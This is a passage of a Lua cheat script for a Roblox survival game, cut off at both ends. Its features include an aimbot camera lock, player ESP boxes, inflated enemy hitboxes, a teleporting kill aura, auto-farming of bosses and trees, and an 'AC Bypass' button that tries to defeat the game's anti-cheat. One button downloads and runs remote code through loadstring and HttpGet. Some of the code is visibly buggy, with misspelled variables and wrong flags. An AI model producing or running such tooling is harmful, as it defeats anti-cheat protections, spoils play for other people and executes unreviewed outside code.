                                    local mag = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(plrpos.X, plrpos.Y)).Magnitude
                                    if mag < dist and (char.HumanoidRootPart.Position - LocalPlayer.Character.HumanoidRootPart.Position).magnitude < dist then
                                        if Wallcheck(char:FindFirstChild('HumanoidRootPart')) then
                                            dist = mag
                                            closest = char
                                        end
                                    end
                                end
                            end
                        end
                    end
                end     
            end
        end
        return closest
    end
    if not getgenv().Updater then
        getgenv().Updater = RunService.RenderStepped:Connect(function()
            if getgenv().configs.PlayerLock then
                if UserInputService:IsMouseButtonPressed(Enum.UserInputType.Mousebutton2) then
                    if GetNearestPlayerToMouse() then
                        CurrentlyLocked = GetNearestPlayerToMouse()
                        local SmoothSnap = TweenService:Create(Camera, TweenInfo.new(0.01, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame = CFrame.new(Camera.CFrame.Position, CurrentlyLocked:FindFirstChild('HumanoidRootPart').Position)})
                        SmoothSnap:Play()
                        SmoothSnap.Completed:Wait()
                    end
                else
                    if CurrentlyLocked ~= nil then
                        CurrentlyLocked = nil
                    end
                end
            end
        end)
    end
end

function Pumpkins()
    while getgenv().configs.Pumpkins do
        if getgenv().configs.Pumpkins then
            task.wait()
            if IsPlayerAlive(LocalPlayer) then
                local hum = LocalPlayer.Character.Humanoid
                if hum.Health < 75 then
                    RemoteEvents['InventoryInteraction']:FireServer(378, "Eat")
                end
            end
        end
    end
end

function Hitbox()
    while getgenv().configs.Hitbox do
        if getgenv().configs.Hitbox then
            task.wait(0.2)
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer then
                    if IsPlayerAlive(plr) and plr.Character:FindFirstChild('Hitbox') then
                        if plr.Character.Hitbox.Size ~= Vector3.new(20, 20, 20) then
                            plr.Character.Hitbox.Size = Vector3.new(20, 20, 20)
                        end
                    end
                end
            end
        end
    end
end

function SafeDeath()
    if getgenv().configs.SafeDeath then
        if not SafeDeathHealthChecker then
            SafeDeathHealthChecker = LocalPlayer.Character:WaitForChild('Humanoid').HealthChanged:Connect(function(health)
                if getgenv().configs.SafeDeath then
                    if not TeleportHappened then
                        if health <= 35 then
                            getgenv().configs.ZenLuckBoss = false
                            getgenv().configs.SpiritBoss = false
                            getgenv().configs.ObsidianBoss = false
                            getgenv().configs.Ogre = false
                            getgenv().configs.Squid = false
                            getgenv().configs.LuckySlime = false
                            getgenv().configs.EvilSkeleton = false
                            local SavePlayer = TweenService:Create(LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(3, Enum.EasingStyle.Linear), {CFrame = CFrame.new(Vector3.new(7135, 73, 18677))})
                            SavePlayer:Play()
                            MakeAtlasNotification("You have been saved from death!", "The Arc Angels have saved you! Heal Up before you go back to battle!", 7)
                            TeleportHappened = true
                            TimeTped = tick()
                        end
                    else
                        if tick() > TimeTped+TimeBetweenTps then
                            TeleportHappened = false
                        end
                    end
                end
            end)
        end
    end
end

function OpKillAura()
    local wastrue = false
    while getgenv().configs.OpKillAura do
        if getgenv().configs.OpKillAura then
            task.wait()
			if OpKillAuraTable[1] then
				if IsPlayerAlive(OpKillAuraTable[1]) and IsPlayerAlive(LocalPlayer) then
					local myroot = LocalPlayer.Character.HumanoidRootPart
					local enemyroot = OpKillAuraTable[1].Character.HumanoidRootPart
					if getgenv().configs.PredictOpKillAura then
						myroot.CFrame = CFrame.new(enemyroot.Position + (enemyroot.AssemblyLinearVelocity/getgenv().PredictAmount))
					else
						myroot.CFrame = CFrame.new(enemyroot.Position)
					end
					if LocalPlayer.Character.Humanoid.Health <= 20 then
						LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(7137, 73, 18673)
						MakeAtlasNotification("You are low!", 'Ive saved you. Heal up.', 8)
					return end
					MyYPos = LocalPlayer.Character.HumanoidRootPart.CFrame.Y
					if MyYPos <= -800 then
						LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(7137, 73, 18673)
						MakeAtlasNotification("Suicide", "Careful, hes trying to suicide you", 3)
					return end
					RemoteEvents['ToolAction']:FireServer(OpKillAuraTable[1].Character)
					if not getgenv().configs.OpKillAura and LocalPlayer.Character.Humanoid.Health > 25 then
						LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(enemyroot + Vector3.new(0, 25, 0))
					end
				end
			end
        end
    end
end

function ConiferFarm()
    local function GetClosestTree()
        local range = math.huge
        local closestree
        for _, tree in pairs(Workspace:WaitForChild('Replicators'):WaitForChild('Both'):GetChildren()) do
            if tree.Name == 'Conifer' then
                local dist = (LocalPlayer.Character.HumanoidRootPart.Position - tree:GetPivot().Position).magnitude
                if dist < range then
                    range = dist
                    closestree = tree
                end
            end
        end
        return closestree
    end

    local function TreeFarm()
        local ClosestTree
        ClosestTree = GetClosestTree()
        if ClosestTree then
            repeat task.wait()
                ClosestTree = GetClosestTree()
                if not getgenv().configs.ConfierFarm then 
                    if IsPlayerAlive(LocalPlayer) then
                        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(LocalPlayer.Character.HumanoidRootPart.CFrame.X+10, LocalPlayer.Character.HumanoidRootPart.CFrame.Y, LocalPlayer.Character.HumanoidRootPart.CFrame.Z-10)
                    end
                    return
                end
                if losestTree.Parent then
                    if IsPlayerAlive(LocalPlayer) then
                        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(ClosestTree:GetPivot().Position)
                        RemoteEvents['ToolAction']:FireServer(ClosestTree)
                    end
                end
            until not ClosestTree.Parent or not IsPlayerAlive(LocalPlayer) or not getgenv().configs.ConfierFarm
        end
    end
    while getgenv().configs.ConfierFarm and task.wait() do
        if not getgenv().configs.ConfierFarm then 
            if IsPlayerAlive(LocalPlayer) then
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(LocalPlayer.Character.HumanoidRootPart.CFrame.X+10, LocalPlayer.Character.HumanoidRootPart.CFrame.Y, LocalPlayer.Character.HumanoidRootPart.CFrame.Z-10)
            end
        end
        if IsPlayerAlive(LocalPlayer) then
            if not Workspace:WaitForChild('Replicators'):WaitForChild('Both'):FindFirstChild('Conifer') then
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(LocalPlayer.Character.HumanoidRootPart.CFrame.X, 400, LocalPlayer.Character.HumanoidRootPart.CFrame.Z)
            else
                TreeFarm()
            end
        end
    end
end

function AutoRepairClub()
    if getgenv().configs.AutoRepairClub then
        local zenwastrue = false
        local spiritwastrue = false
        local obwastrue = false
        for _, tool in pairs(MyInventory:GetChildren()) do
            if tool.Name == 'Obsidian Club' then
                if not getgenv().PercentChanged then
                    getgenv().PercentChanged = tool:FindFirstChild('Top'):FindFirstChild('Right'):FindFirstChild('Degradable'):FindFirstChild('Label'):GetPropertyChangedSignal("Text"):Connect(function()
                        if not getgenv().configs.AutoRepairClub then
                            getgenv().PercentChanged:Disconnect()
                            getgenv().PercentChange = nil
                            return
                        end
                        local percentdegraded = tool:FindFirstChild('Top'):FindFirstChild('Right'):FindFirstChild('Degradable'):FindFirstChild('Label').Text:sub(1, 4)
                        local checkdecimal = tool:FindFirstChild('Top'):FindFirstChild('Right'):FindFirstChild('Degradable'):FindFirstChild('Label').Text:sub(3, 3)
                        if checkdecimal == '.' then
                            if tonumber(percentdegraded) <= 50.5 then
                                local ClosestChest = GetClosestChest()
                                if ClosestChest then
                                    RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, true, 230)
                                    RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, false, 230)
                                    MakeAtlasNotification('Repaired', 'Club repaired', 1)
                                    task.wait(0.2)
                                    pcall(function()
                                        if MyInventory:FindFirstChild('Obsidian Club') then
                                            if MyInventory:FindFirstChild('Obsidian Club'):FindFirstChild('Bottom'):FindFirstChild('Equip'):FindFirstChild('TextLabel').Text == "Equip" then
                                                RemoteEvents['InventoryInteraction']:FireServer(230, "Equip")
                                            end
                                        end
                                    end)
                                else
                                    if getgenv().configs.ZenLuckBoss then
                                        zenwastrue = true
                                        getgenv().configs.ZenLuckBoss = false
                                    elseif getgenv().configs.SpiritBoss then
                                        spiritwastrue = true
                                        getgenv().configs.SpiritBoss = false
                                    elseif getgenv().configs.ObsidianBoss then
                                        obwastrue = true
                                        getgenv().configs.ObsidianBoss = false
                                    end
                                    if IsPlayerAlive(LocalPlayer) then
                                        task.wait(0.2)
                                        local oldpos = LocalPlayer.Character.HumanoidRootPart.CFrame
                                        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(7296, 274, 18681))
                                        task.wait(0.5)
                                        RemoteEvents['CraftItem']:FireServer(11, Vector3.new(7303.52, 288, 18678.74), 0)
                                        task.wait(0.5)
                                        local ClosestChest = GetClosestChest()
                                        if ClosestChest then
                                            RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, true, 230)
                                            RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, false, 230)
                                            MakeAtlasNotification('Repaired', 'Club repaired', 1)
                                            task.wait(0.2)
                                            pcall(function()
                                                if MyInventory:FindFirstChild('Obsidian Club') then
                                                    if MyInventory:FindFirstChild('Obsidian Club'):FindFirstChild('Bottom'):FindFirstChild('Equip'):FindFirstChild('TextLabel').Text == "Equip" then
                                                        RemoteEvents['InventoryInteraction']:FireServer(230, "Equip")
                                                    end
                                                end
                                            end)
                                            if zenwastrue then
                                                zenwastrue = false
                                                task.spawn(function()
                                                    getgenv().configs.ZenLuckBoss = true
                                                    ZenLuckBoss()
                                                end)
                                            elseif spiritwastrue then
                                                spiritwastrue = false
                                                task.spawn(function()
                                                    getgenv().configs.SpiritBoss = true
                                                    SpiritBoss()
                                                end)
                                            elseif obwastrue then
                                                obwastrue = false
                                                task.spawn(function()
                                                    getgenv().configs.ObsidianBoss = true
                                                    ObsidianBoss()
                                                end)
                                            else
                                                LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end)
                end
            end
        end
    else
        if getgenv().PercentChanged then
            getgenv().PercentChanged:Disconnect()
            getgenv().PercentChanged = nil
        end
    end
end

function TrapPlayer()
    if IsPlayerAlive(LocalPlayer) then
        local function GetClosestTrapPlayer()
            local range = 70
            local closest = nil
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
                    local dist = (LocalPlayer.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude
                    if plr.Character.Humanoid.MoveDirection.Magnitude > 0 then
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position + plr.Character.HumanoidRootPart.AssemblyLinearVelocity) + Vector3.new(0, 1, 0)
                        end
                    else
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position) + Vector3.new(0, 1, 0)
                        end
                    end
                end
            end
            return closest
        end
        RemoteEvents['CraftItem']:FireServer(371, GetClosestTrapPlayer(), 690)
    end
end

function ObsidianBoss()
    while getgenv().configs.ObsidianBoss do
        if getgenv().configs.ObsidianBoss then
            task.wait()
            if getgenv().configs.KillAura == true then
                getgenv().configs.KillAura = false
            end
            if IsPlayerAlive(LocalPlayer) then
            local Boss = Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Obsidian Golem')
                if not getgenv().configs.ZenLuckBoss and not getgenv().configs.SpiritBoss then
                    if Boss and Boss:FindFirstChild('HumanoidRootPart') and Boss:FindFirstChild('Humanoid') and Boss:FindFirstChild('Humanoid').Health > 0 then
                        if not AutoPickupOnObsidianDeath then
                            AutoPickupOnObsidianDeath = Boss.AncestryChanged:Connect(function(golem, parent)
                                if not getgenv().configs.ObsidianBoss then
                                    AutoPickupOnObsidianDeath:Disconnect()
                                    AutoPickupOnObsidianDeath = nil
                                end
                                if not parent then
                                    task.wait(0.2)
                                    AutoPickup()
                                    if AutoPickupOnObsidianDeath then
                                        AutoPickupOnObsidianDeath:Disconnect()
                                        AutoPickupOnObsidianDeath = nil
                                    end
                                end
                            end)
                        end
                        local bosspos = Boss.HumanoidRootPart.Position
                        local myroot = LocalPlayer.Character.HumanoidRootPart
                        if Boss.Humanoid.Health > 50 then
                            myroot.CFrame = CFrame.new(bosspos + Vector3.new(-8, 13.5, 0))
                        else
                            myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 15, 0))
                        end
                        RemoteEvents['ToolAction']:FireServer(Boss)
                    end
                end
            end
        end
    end
end

function ZenLuckBoss()
    local function AttackBoss()
        local Boss = Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Zenyte Golem') or Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Lucky Golem')
        if Boss and Boss:FindFirstChild('HumanoidRootPart') and Boss:FindFirstChild('Humanoid') and Boss:FindFirstChild('Humanoid').Health > 0 then
            if not AutoPickupOnZenLuckBossDeath then
                AutoPickupOnZenLuckBossDeath = Boss.AncestryChanged:Connect(function(slime, parent)
                    if not getgenv().configs.ZenLuckBoss then
                        AutoPickupOnZenLuckBossDeath:Disconnect()
                        AutoPickupOnZenLuckBossDeath = nil
                    end
                    if not parent then
                        task.wait(0.2)
                        AutoPickup()
                        if AutoPickupOnZenLuckBossDeath then
                            AutoPickupOnZenLuckBossDeath:Disconnect()
                            AutoPickupOnZenLuckBossDeath = nil
                        end
                    end
                end)
            end
            local bosspos = Boss.HumanoidRootPart.Position
            local myroot = LocalPlayer.Character.HumanoidRootPart
            if Boss.Humanoid.Health > 50 then
                myroot.CFrame = CFrame.new(bosspos + Vector3.new(-8, 13, 0))
            else
                myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 10, 0))
            end
            RemoteEvents['ToolAction']:FireServer(Boss)
        else
            if not AutoPickupOnZenLuckBossDeath then
                task.wait(1)
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1663, -460, -4558)
                RemoteEvents['KeyDoor']:FireServer(Workspace:WaitForChild('Map'):WaitForChild("Zenyte Boss Cave"):WaitForChild("Cave Door (z)"))
            end
        end
    end
    while getgenv().configs.ZenLuckBoss do
        if getgenv().configs.ZenLuckBoss then
            task.wait()
            if getgenv().configs.KillAura == true then
                getgenv().configs.KillAura = false
            end
            if IsPlayerAlive(LocalPlayer) then
                local Soul = MyInventory:FindFirstChild('Soul')
                if Workspace:WaitForChild('Map'):WaitForChild("Zenyte Boss Cave"):FindFirstChild("Gem Clusters") then
                    Workspace:WaitForChild('Map'):WaitForChild("Zenyte Boss Cave"):FindFirstChild("Gem Clusters"):Destroy()
                end
                if getgenv().configs.ObsidianBoss then
                    if not Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Obsidian Golem') then
                        AttackBoss()
                    end
                else
                    AttackBoss()
                end
                if getgenv().configs.UseSoulKeys then
                    if Soul and Soul:FindFirstChild('Top'):FindFirstChild('TextLabel') then
                        local SoulAmount = string.match(Soul.Top.TextLabel.Text, '%d+')
                        if tonumber(SoulAmount) >= 10 and not MyInventory:FindFirstChild('Soul Key') then
                            RemoteEvents['CraftItem']:FireServer(220)
                        end
                    end
                end
            end
        end
    end
end

function SpiritBoss()
    local function AttackBoss()
        local Boss = Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Zenyte Golem') or Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Lucky Golem')
        if Boss and Boss:FindFirstChild('HumanoidRootPart') and Boss:FindFirstChild('Humanoid') and Boss:FindFirstChild('Humanoid').Health > 0 then
            if not AutoPickupOnSpiritBossDeath then
                AutoPickupOnSpiritBossDeath = Boss.AncestryChanged:Connect(function(slime, parent)
                    if not getgenv().configs.SpiritBoss then
                        AutoPickupOnSpiritBossDeath:Disconnect()
                        AutoPickupOnSpiritBossDeath = nil
                    end
                    if not parent then
                        task.wait(0.2)
                        AutoPickup()
                        if AutoPickupOnSpiritBossDeath then
                            AutoPickupOnSpiritBossDeath:Disconnect()
                            AutoPickupOnSpiritBossDeath = nil
                        end
                    end
                end)
            end
            local bosspos = Boss.HumanoidRootPart.Position
            local myroot = LocalPlayer.Character.HumanoidRootPart
            if Boss.Humanoid.Health >= 50 then
                TweenService:Create(myroot, TweenInfo.new(0.05, Enum.EasingStyle.Linear), {CFrame = CFrame.new(bosspos + Vector3.new(-13, 18, 0))}):Play()
            else
                TweenService:Create(myroot, TweenInfo.new(0.1, Enum.EasingStyle.Linear), {CFrame = CFrame.new(bosspos + Vector3.new(0, 22, 0))}):Play()
            end
            if not getgenv().configs.SpiritBoss == false then
                TweenService:Create(myroot, TweenInfo.new(0.1, Enum.EasingStyle.Linear), {CFrame = CFrame.new(bosspos + Vector3.new(25, 18, 0))}):Play()
            end
            RemoteEvents['ToolAction']:FireServer(Boss)
        else
            if not AutoPickupOnSpiritBossDeath then
                task.wait(1)
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1663, -460, -4558)
                RemoteEvents['KeyDoor']:FireServer(Workspace:WaitForChild('Map'):WaitForChild("Mushroom Boss Cave "):WaitForChild("Cave Door (d)"))
            end
        end
    end
    while getgenv().configs.ZenLuckBoss do
        if getgenv().configs.ZenLuckBoss then
            task.wait()
            if getgenv().configs.KillAura == true then
                getgenv().configs.KillAura = false
            end
            if IsPlayerAlive(LocalPlayer) then
                local Soul = MyInventory:FindFirstChild('Soul')
                if Workspace:FindFirstChild('PoisionMushroom') then
                    Workspace:FindFirstChild('PoisionMushroom'):Destroy()
                end
                if getgenv().configs.ObsidianBoss then
                    if not Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Obsidian Golem') then
                        AttackBoss()
                    end
                else
                    AttackBoss()
                end
                if getgenv().configs.UseSoulKeys then
                    if Soul and Soul:FindFirstChild('Top'):FindFirstChild('TextLabel') then
                        local SoulAmount = string.match(Soul.Top.TextLabel.Text, '%d+')
                        if tonumber(SoulAmount) >= 10 and not MyInventory:FindFirstChild('Soul Key') then
                            RemoteEvents['CraftItem']:FireServer(220)
                        end
                    end
                end
            end
        end
    end
end

function LuckySlime()
    while getgenv().configs.LuckySlime do
        if getgenv().configs.LuckySlime then
            task.wait()
            if getgenv().configs.KillAura == true then
                getgenv().configs.KillAura = false
            end
            if IsPlayerAlive(LocalPlayer) then
                local Boss = Workspace:WaitForChild('Replicators'):WaitForChild('Both'):FindFirstChild('Lucky Slime')
                if Boss and Boss:FindFirstChild('HumanoidRootPart') and Boss:FindFirstChild('Humanoid') and Boss:FindFirstChild('Humanoid').Health > 0 then
                    if not AutoPickuponLuckySlimeDeath then
                        AutoPickuponLuckySlimeDeath = Boss.AncestryChanged:Connect(function(slime, parent)
                            if not getgenv().configs.LuckySlime then
                                AutoPickuponLuckySlimeDeath:Disconnect()
                                AutoPickuponLuckySlimeDeath = nil
                            end
                            if not parent then
                                task.wait(0.2)
                                AutoPickup()
                                if AutoPickuponLuckySlimeDeath then
                                    AutoPickuponLuckySlimeDeath:Disconnect()
                                    AutoPickuponLuckySlimeDeath = nil
                                end
                            end
                        end)
                    end
                    local bosspos = Boss.HumanoidRootPart.Position
                    local myroot = LocalPlayer.Character.HumanoidRootPart
                    if Boss.Humanoid.Health > 50 then
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(-8, 13.5, 0))
                    else
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 15, 0))
                    end
                    RemoteEvents['ToolAction']:FireServer(Boss)
                end
            end
        end
    end
end

function EvilSkeleton()
    while getgenv().configs.EvilSkeleton do
        if getgenv().configs.EvilSkeleton then
            task.wait()
            if getgenv().configs.KillAura == true then
                getgenv().configs.KillAura = false
            end
            if IsPlayerAlive(LocalPlayer) then
                local Boss = Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Evil Skeleton')
                if Boss and Boss:FindFirstChild('HumanoidRootPart') and Boss:FindFirstChild('Humanoid') and Boss:FindFirstChild('Humanoid').Health > 0 then
                    if not AutoPickupOnSkeletonDeath then
                        AutoPickupOnSkeletonDeath = Boss.AncestryChanged:Connect(function(slime, parent)
                            if not getgenv().configs.EvilSkeleton then
                                AutoPickupOnSkeletonDeath:Disconnect()
                                AutoPickupOnSkeletonDeath = nil
                            end
                            if not parent then
                                task.wait(0.2)
                                AutoPickup()
                                if AutoPickupOnSkeletonDeath then
                                    AutoPickupOnSkeletonDeath:Disconnect()
                                    AutoPickupOnSkeletonDeath = nil
                                end
                            end
                        end)
                    end
                    local bosspos = Boss.HumanoidRootPart.Position
                    local myroot = LocalPlayer.Character.HumanoidRootPart
                    if Boss.Humanoid.Health > 50 then
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, -15, 0))
                    else
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 17.5, 0))
                    end
                    if not getgenv().configs.EvilSkeleton then
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 17.5, 0))
                    end
                    RemoteEvents['ToolAction']:FireServer(Boss)
                end
            end
        end
    end
end

function Ogre()
    while getgenv().configs.Ogre do
        if getgenv().configs.Ogre then
            task.wait()
            if getgenv().configs.KillAura == true then
                getgenv().configs.KillAura = false
            end
            if IsPlayerAlive(LocalPlayer) then
                local Boss = Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Ogre')
                if Boss and Boss:FindFirstChild('HumanoidRootPart') and Boss:FindFirstChild('Humanoid') and Boss:FindFirstChild('Humanoid').Health > 0 then
                    if not AutoPickupOnOgreDeath then
                        AutoPickupOnOgreDeath = Boss.AncestryChanged:Connect(function(slime, parent)
                            if not getgenv().configs.Ogre then
                                AutoPickupOnOgreDeath:Disconnect()
                                AutoPickupOnOgreDeath = nil
                            end
                            if not parent then
                                task.wait(0.2)
                                AutoPickup()
                                if AutoPickupOnOgreDeath then
                                    AutoPickupOnOgreDeath:Disconnect()
                                    AutoPickupOnOgreDeath = nil
                                end
                            end
                        end)
                    end
                    local bosspos = Boss.HumanoidRootPart.Position
                    local myroot = LocalPlayer.Character.HumanoidRootPart
                    if Boss.Humanoid.Health > 50 then
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(-8, 13.5, 0))
                    else
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 15, 0))
                    end
                    RemoteEvents['ToolAction']:FireServer(Boss)
                end
            end
        end
    end
end

function Squid()
    while getgenv().configs.Squid do
        if getgenv().configs.Squid then
            task.wait()
            if getgenv().configs.KillAura == true then
                getgenv().configs.KillAura = false
            end
            if IsPlayerAlive(LocalPlayer) then
                local Boss = Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Captain Squid')
                if Boss and Boss:FindFirstChild('HumanoidRootPart') and Boss:FindFirstChild('Humanoid') and Boss:FindFirstChild('Humanoid').Health > 0 then
                    if not AutoPickupOnSquidDeath then
                        AutoPickupOnSquidDeath = Boss.AncestryChanged:Connect(function(slime, parent)
                            if not getgenv().configs.Squid then
                                AutoPickupOnSquidDeath:Disconnect()
                                AutoPickupOnSquidDeath = nil
                            end
                            if not parent then
                                task.wait(0.2)
                                AutoPickup()
                                if AutoPickupOnSquidDeath then
                                    AutoPickupOnSquidDeath:Disconnect()
                                    AutoPickupOnSquidDeath = nil
                                end
                            end
                        end)
                    end
                    local bosspos = Boss.HumanoidRootPart.Position
                    local myroot = LocalPlayer.Character.HumanoidRootPart
                    if Boss.Humanoid.Health > 50 then
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, -15, 0))
                    else
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 17.5, 0))
                    end
                    if not getgenv().configs.Squid then
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 17.5, 0))
                    end
                    RemoteEvents['ToolAction']:FireServer(Boss)
                end
            end
        end
    end
end

function InfJump()
    getgenv().InfiniteJump = Mouse.KeyDown:Connect(function(Key)
        if Key == " " then
            if getgenv().configs.InfJump and IsPlayerAlive(LocalPlayer) then
                LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):ChangeState(3)
            else
                getgenv().InfiniteJump:Disconnect()
            end
        end
    end)
end

function JumpPower()
    while getgenv().configs.JumpPower do
        if getgenv().configs.JumpPower then
            task.wait()
            if IsPlayerAlive(LocalPlayer) then
                LocalPlayer.Character.Humanoid.JumpPower = 100
            end
        end
    end
end

function ExtraSpeed()
    while getgenv().configs.ExtraSpeed do
        if getgenv().configs.ExtraSpeed then
            task.wait()
            if IsPlayerAlive(LocalPlayer) then
                LocalPlayer.Character.Humanoid.WalkSpeed = 21
            end
        end
    end
end

local ChrAddedFunc
function PlayerEsp()
    if getgenv().configs.PlayerEsp then
        function EspOnPlayer(target)
            local EspRenderStepped
            local Boxoutline = Drawing.new('Square')
            Boxoutline.Thickness = 1
            Boxoutline.Filled = false
            Boxoutline.Transparency = 1
            Boxoutline.Color = Color3.new(0, 0, 0)
            
            local Box = Drawing.new('Square')
            Box.Thickness = 1
            Box.Transparency = 1
            Box.Filled = false
            Box.Color = Color3.fromRGB(0, 255, 0)
            
            local Healthbaroutline = Drawing.new('Square')
            Healthbaroutline.Thickness = 1
            Healthbaroutline.Filled = false
            Healthbaroutline.Transparency = 1
            Healthbaroutline.Color = Color3.new(0, 0, 0)
            
            local Healthbar = Drawing.new('Square')
            Healthbar.Thickness = 1
            Healthbar.Filled = false
            Healthbar.Transparency = 1
            Healthbar.Color = Color3.fromRGB(0, 255, 0)
            EspRenderStepped = RunService.RenderStepped:Connect(function()
                if getgenv().configs.PlayerEsp == false then
                    if Boxoutline then
                        Boxoutline:Remove()
                    end
                    if Box then
                        Box:Remove()
                    end
                    if Healthbaroutline then
                        Healthbaroutline:Remove()
                    end
                    if Healthbar then
                        Healthbar:Remove()
                    end
                    if EspRenderStepped then
                        EspRenderStepped:Disconnect()
                    end
                return end
                if target then
                    if IsPlayerAlive(target) then
                        local HumPos, onScreen = Camera:WorldToViewportPoint(target.Character.HumanoidRootPart.Position)
                        if onScreen then
                            local headpos = Camera:WorldToViewportPoint(target.Character.Head.Position + Vector3.new(0, 0.5, 0))
                            local LegPosition = Camera:WorldToViewportPoint(target.Character.HumanoidRootPart.Position - Vector3.new(0, 4.5, 0))
                            
                            Boxoutline.Size = Vector2.new(1050 / HumPos.Z, headpos.Y - LegPosition.Y)
                            Boxoutline.Position = Vector2.new(HumPos.X - Boxoutline.Size.X / 2, HumPos.Y - Boxoutline.Size.Y / 2)
                            Boxoutline.Visible = true
                            
                            Box.Size = Vector2.new(1050 / HumPos.Z, headpos.Y - LegPosition.Y)
                            Box.Position = Vector2.new(HumPos.X - Box.Size.X / 2, HumPos.Y - Box.Size.Y / 2 )
                            Box.Visible = true
                            
                            Healthbaroutline.Size = Vector2.new(2, headpos.Y - LegPosition.Y)
                            Healthbaroutline.Position = Boxoutline.Position - Vector2.new(8, 0)
                            Healthbaroutline.Visible = true
                            
                            Healthbar.Size = Vector2.new(2, (headpos.Y - LegPosition.Y) / (target.Character:FindFirstChildOfClass('Humanoid').MaxHealth / math.clamp(target.Character:FindFirstChildOfClass('Humanoid').Health, 0, target.Character:FindFirstChildOfClass('Humanoid').MaxHealth)))
                            Healthbar.Position = Vector2.new(Box.Position.X - 8, Box.Position.Y + (1/Healthbar.Size.Y))
                            Healthbar.Color = Color3.fromRGB(255, 0, 0):lerp(Color3.fromRGB(0, 255, 0), target.Character:FindFirstChildOfClass('Humanoid').Health / target.Character:FindFirstChildOfClass('Humanoid').MaxHealth)
                            Healthbar.Visible = true
                        else
                            Boxoutline.Visible = false
                            Box.Visible = false
                            Healthbaroutline.Visible = false
                            Healthbar.Visible = false
                        end
                    else
                        Boxoutline.Visible = false
                        Box.Visible = false
                        Healthbaroutline.Visible = false
                        Healthbar.Visible = false
                    end
                end
            end)
        end
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                EspOnPlayer(plr)
            end
        end
        if not ChrAddedFunc then
            ChrAddedFunc = Players.PlayerAdded:Connect(function(plr)
                if not getgenv().configs.PlayerEsp then
                    ChrAddedFunc:Disconnect()
                    ChrAddedFunc = nil
                end
                EspOnPlayer(plr)
            end)
        end
    end
end

--Sections and ui stuff
local MainSection = Main:CreateSection("Main")

MainSection:CreateToggle({
    Name = 'Remember Configs',
    Default = false,
    Flag = 'RememberConfigs',
    Callback = function(Value)
        return Value
    end
})

MainSection:CreateButton({
    Name = 'AC Bypass',
    Callback = function()
        if not IsPlayerAlive(LocalPlayer) then
            MakeAtlasNotification('Not alive', 'Maybe click the play button?', 5)
            return
        end
        if IsPlayerAlive(LocalPlayer) then
            local oldpos = LocalPlayer.Character.HumanoidRootPart.CFrame
            local myroot = LocalPlayer.Character.HumanoidRootPart
			for i=1, 100 do
				myroot.CFrame = CFrame.new(7562, 221, 18946)
            	RemoteEvents['Sonar']:FireServer()
            	myroot.CFrame = oldpos
			end
            message.New('Positive', 'Bypassed AntiCheat')
        end
    end
})

MainSection:CreateInteractable({
    Name = 'Infinite Yield',
    ActionText = 'Execute',
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source', true))()
    end
})

MainSection:CreateKeybind({
    Name = 'AutoPickup',
    Default = "X",
	Flag = 'AutoPickup',
	KeyPressed = AutoPickup,
})

MainSection:CreateToggle({
    Name = 'AutoPickup(toggle)',
	Default = false,
	Flag = 'AutoPickup(toggle)',
    Callback = function(Value)
        getgenv().configs.AutoPickup2 = Value
        AutoPickup2() 
    end
})

MainSection:CreateButton({
    Name = 'Steal any op loot on ground',
    Callback = function(Value)
        local function FindFunnyClosestItem()
            local closest
            local range = math.huge
            for _, funnyitem in pairs(Workspace:GetDescendants()) do
				if funnyitem:IsA("Model") then
